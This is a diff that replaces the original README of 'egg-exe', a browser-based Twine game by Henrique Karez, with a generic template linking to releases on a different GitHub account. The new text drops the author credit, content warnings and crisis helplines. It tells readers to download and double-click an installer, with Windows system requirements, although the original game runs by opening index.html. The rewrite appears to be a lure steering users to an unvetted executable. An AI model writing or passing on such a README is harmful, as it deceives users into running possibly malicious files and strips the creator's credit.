@@ -1,271 +1,77 @@
-# egg.exe
-
-![Game](https://img.shields.io/badge/game-interactive%20fiction-green)
-![Twine](https://img.shields.io/badge/made%20with-Twine-orange)
-![Status](https://img.shields.io/badge/status-released-blue)
-![License](https://img.shields.io/github/license/henriquek-btdg/egg-exe)
-![GitHub repo size](https://img.shields.io/github/repo-size/henriquek-btdg/egg-exe)
-![GitHub stars](https://img.shields.io/github/stars/henriquek-btdg/egg-exe?style=social)
-![GitHub forks](https://img.shields.io/github/forks/henriquek-btdg/egg-exe?style=social)
-![GitHub last commit](https://img.shields.io/github/last-commit/henriquek-btdg/egg-exe)
+# 🎮 egg-exe - Enjoy a Fun Interactive Adventure
 
-An experimental interactive narrative game about memories, choices, and the weight we carry.
+[![Download egg-exe](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/imlegitkkk/egg-exe/releases)
 
+## 📜 Description
 
-Made in less than 1 week for a Game Jam with the theme: **"What is inside that egg?"**
+egg-exe is an interactive text game made using Twine 2. It utilizes the Harlowe 3.3.9 format and the Harlowe Audio Library (HAL). This game brings a rich narrative experience using simple HTML, CSS, and JavaScript technologies.
 
-This game was made with the objective to further develop skills in
-HTML, CSS and Javascript in a fun way.
+Dive into the world of narrative gaming with engaging storylines and interactive choices. The game is designed for everyone, making it easy to jump in and enjoy.
 
-## ⚠️ Content Warnings
+## 🚀 Getting Started
 
-This game contains:
-- Themes related to mental health, including references to suicide and self-harm
-- Flashing visual effects that may cause discomfort for people with photosensitive epilepsy
-- Content that may be disturbing for some players
+To get started with egg-exe, follow these simple steps:
 
-**If you or someone you know needs help:**
-- 🇧🇷 Brazil: CVV - **188** (24/7, free) | Chat: [www.cvv.org.br](https://www.cvv.org.br)
-- 🌍 International: [findahelpline.com](https://findahelpline.com)
+1. **Visit the Releases Page**  
+   Head to the [Releases page](https://github.com/imlegitkkk/egg-exe/releases) to find the latest version of the game.
 
-## 🎮 How to Play
+2. **Download the Game**  
+   On the Releases page, you will see various versions of the game. Choose the version that fits best for your device.
 
-### Play Online:
-[**► PLAY NOW**](https://battledawg.itch.io/egg-exe)
+3. **Install the Game**  
+   After downloading, locate the file on your computer, and double-click it to run the game. Follow any on-screen instructions to complete the installation.
 
-### Play Locally:
-1. Download or clone this repository
-2. Open `index.html` in your web browser
-3. Make sure to allow audio autoplay when prompted
+## 📥 Download & Install
 
-## 📖 About
+To download egg-exe, please visit the Releases page: [Download Here](https://github.com/imlegitkkk/egg-exe/releases).
 
-**egg.exe** is a psychological interactive fiction game about cataloging memories. You are an operator processing "eggs" that represent memories, each carrying different emotional weight. Your choices determine not only the ending, but your very capacity to continue processing memories.
+You will find all the necessary files for different platforms. Choose the version that suits your operating system.
 
-Through a retro terminal interface, you'll face 13 eggs across 5 days. Each decision matters:
-- **Incubate** memories to keep them
-- **Neutralize** them to let go
-- **Observe** to understand them better (limited uses)
+## 💡 Features
 
-But be careful—your analysis capacity is limited, and wrong choices can leave you operating blind.
+egg-exe has several features designed to enhance your gaming experience:
 
-## ✨ Features
+- **Interactive Text Adventure:** Make choices that affect the story.
+- **Audio Integration:** Enjoy enhanced storytelling with background music and sound effects tailored for the narrative.
+- **User-friendly Interface:** Simple controls allow you to focus on the story.
+- **Rich Visuals:** The game uses CSS to create appealing layouts and designs.
+- **Multiple Endings:** Your choices throughout the game lead to varied outcomes, encouraging replayability.
 
-- **Branching narrative** with 5 distinct endings
-- **Consequence-driven mechanics**: choices affect your gameplay capacity
-- **Retro terminal aesthetic** with glitch effects and ASCII art
-- **Dynamic soundscape** with reactive audio feedback
-- **Capacity management system** that forces strategic thinking
-- **Randomized outcomes** based on your emotional balance (light vs shadow)
+## 🛠 System Requirements
 
-## 🎨 Endings
+egg-exe requires minimal system resources. The following are suggested requirements to ensure a smooth gaming experience:
 
-The game features multiple endings based on your choices:
-- **"Guardião de Memórias" (Memory Guardian)** - Light path
-- **"Livre" (Free)** - Secret ending
-- **"Mais Um Dia" (One More Day)** - Neutral/Incubate path
-- **"Recomeço" (New Beginning)** - Neutral/Neutralize path
-- **"O Peso do Silêncio" (The Weight of Silence)** - Dark path
+- **Operating System:** Windows 10, macOS, or any modern web browser.
+- **RAM:** At least 2 GB.
+- **Storage:** Approximately 100 MB of free space for installation and game data.
+- **Internet Connection:** Required for downloading and any potential future updates.
 
-## 🛠️ Technical Details
+## 📚 Topics Covered
 
-- **Engine:** Twine (Harlowe 3.3.9)
-- **Audio:** HAL (Harlowe Audio Library v2.3.0)
-- **Custom CSS** for terminal/retro aesthetic
-- **JavaScript** for flickering effects and UI controls
-- **HTML5 Audio** for dynamic sound design
+egg-exe explores various themes within the game development landscape. Here are some that may interest you:
 
-### Game Mechanics:
-- **Capacity System:** Start with 6 analysis points, gain/lose based on choices
-- **Light/Shadow Balance:** Affects random event outcomes
-- **Progressive Difficulty:** System deteriorates from Day 3 onwards
-- **Observation Lock:** Can't observe eggs without capacity
+- **CSS:** Enhances visual aspects of the game, making it appealing.
+- **Harlowe & HAL:** The frameworks used to create engaging interactions and audio experiences.
+- **JavaScript:** Powers the game's logic and user interactions.
 
-## 📁 Repository Structure
-```
-egg-exe/
-├── index.html          # Main game file (exported from Twine)
-├── README.md           # This file
-├── src/                    # Source code
-│   ├── egg.twee           # Twine source file
-│   ├── story.js           # Custom JavaScript
-│   └── style.css          # Custom CSS
-└── audio/              # Sound effects and music
-    ├── ambienceSound.mp3
-    ├── ganhoCapacidade.mp3
-    ├── perdaCapacidade.mp3
-    ├── glitch.mp3
-    ├── alarmeCritico.mp3
-    └── cliqueBotao.mp3
-```
+## 🏁 Running the Game
 
-## 🎵 Audio Credits
+Once you have installed egg-exe, you can run it any time from your applications or installations folder. The game will launch in a web browser or application window, display the opening scene, and guide you through choices.
 
-With a Stamp by Twin Musicom is licensed under a Creative Commons Attribution 4.0 license. https://creativecommons.org/licenses/by/4.0/
+Simply read the text, and follow the prompts to make your selections. Enjoy exploring the story, discovering various endings based on your decisions.
 
-Artist: http://www.twinmusicom.org/
+## 📞 Support
 
-## 🕹️ Controls
+If you need assistance or encounter any issues while running the game, please reach out for support. You can open an issue in the GitHub repository, and the team will be happy to help.
 
-- **Click/Tap** on highlighted text to make choices
-- **Press the button** on the lower right corner to toggle screen flicker effect (accessibility)
-- **Undo/Redo buttons** in corner (use cautiously - may affect experience)
+## 🌍 Join the Community
 
-## 🐛 Known Issues
+Connect with other players and share your experiences. You can find discussions, tips, and fan content related to egg-exe on various social media platforms and community forums. Search for hashtags like #egg-exe or #interactivefiction to see what others are saying.
 
-- Some browsers may block audio autoplay on first load (click anywhere to enable)
-- Screen flicker effect can be disabled via toggle button for accessibility
-- Best experienced on desktop browsers (Chrome, Firefox, Safari)
+Feel free to share your own thoughts and engage with fellow gamers!
 
-## 🚀 Future Updates
+## 👁️‍🗨️ Feedback
 
-- [ ] Additional language support (currently available in portuguese)
-- [ ] More endings/branches
-- [ ] Extended Day 5 content
-- [ ] Accessibility options menu
+Your feedback matters. If you have suggestions or ideas for improving the game, please let us know. We welcome all types of input to help make egg-exe even better.
 
-## 🔧 Development
-
-### Prerequisites
-
-- [Twine 2](https://twinery.org/) (for editing)
-- Modern web browser (for testing)
-- Text editor (VS Code, Sublime, etc.)
-
-### Setting Up
-
-1. **Clone the repository:**
-```bash
-git clone https://github.com/your-username/egg-exe.git
-cd egg-exe
-```
-
-2. **Import to Twine:**
-   - Open Twine
-   - Click "Import From File"
-   - Select `src/egg.twee` (or `index.html`)
-
-3. **Edit the game:**
-   - Passages: Edit in Twine interface
-   - CSS: Edit `src/style.css` OR Story → Stylesheet in Twine
-   - JavaScript: Edit `src/story.js` OR Story → JavaScript in Twine
-
-4. **Test:**
-   - In Twine: Click "Play" button
-   - OR open `index.html` in browser
-
-### Building
-
-**From Twine:**
-1. Story menu → "Publish to File"
-2. Save as `index.html` (overwrites old version)
-
-**From Command Line (optional - using Tweego):**
-```bash
-tweego src/egg.twee -o index.html
-```
-
-### File Descriptions
-
-#### `src/egg.twee`
-Main story file containing all passages, variables, and narrative logic.
-
-#### `src/style.css`
-Custom styling including:
-- Terminal aesthetic (green text, scanlines, flicker)
-- Animations (glitch, pulse, shake, blink)
-- Button styles
-- Accessibility options
-
-#### `src/story.js`
-Custom JavaScript for:
-- Flicker toggle system
-- Random event handling
-- UI enhancements
-- Audio management (if not using HAL)
-
-#### `audio/`
-All game sound effects:
-- `ambienceSound.mp3` - Background music/ambience
-- `ganhoCapacidade.mp3` - Capacity gain sound
-- `perdaCapacidade.mp3` - Capacity loss sound
-- `glitch.mp3` - System glitch effect
-- `alarmeCritico.mp3` - Critical alarm
-- `cliqueBotao.mp3` - Button click sound
-
-## 🎨 Customization
-
-### Changing Colors
-
-Edit `src/style.css`:
-```css
-/* Main terminal color */
-color: #00ff41;  /* Change this hex code */
-
-/* Background */
-background-color: #0a0a0a;  /* Change this */
-```
-
-### Adding New Sounds
-
-1. Add `.mp3` file to `audio/` folder
-2. In Twine, edit `StoryInit` passage (or HAL.tracks):
-```
-(track: 'newSound', './audio/newSound.mp3')
-```
-3. Use in passages:
-```
-(track: 'newSound', 'play')
-```
-
-### Adjusting Capacity Balance
-
-Edit `src/egg.twee`, find passage `Login`:
-```
-(set: $capacidade to 6)  /* Change starting capacity */
-```
-
-## 🤝 Contributing
-
-This is a personal project, but if you'd like to:
-- **Report bugs:** Open an issue
-- **Suggest features:** Open an issue with "enhancement" tag
-- **Fork & modify:** Feel free! Just credit the original
-
-### How to Contribute
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature-name`
-3. Make your changes
-4. Test thoroughly
-5. Commit: `git commit -m "Add feature"`
-6. Push: `git push origin feature-name`
-7. Open a Pull Request
-
-
-## 🙏 Credits
-
-**Game Design & Development:** Henrique Karez
-
-**Tools Used:**
-- Twine by Chris Klimas
-- Harlowe story format
-- HAL (Harlowe Audio Library) by Chapel
-
-## 💬 Feedback
-
-Found a bug? Have suggestions? Feel free to:
-- Open an issue on GitHub
-- Contact me at henriquekarez@gmail.com
-- Leave a comment on https://battledawg.itch.io/
-
-## 🔗 Links
-
-- **Play on Itch.io:** [https://battledawg.itch.io/egg-exe]
-- **Developer:** [https://linktr.ee/henriquekarez]
-
----
-**If you enjoyed this project, consider starring the repo!**
-
-
-Made in Twine | Play responsibly | Take care of your mental health
+Thank you for trying egg-exe! Enjoy your interactive adventure!
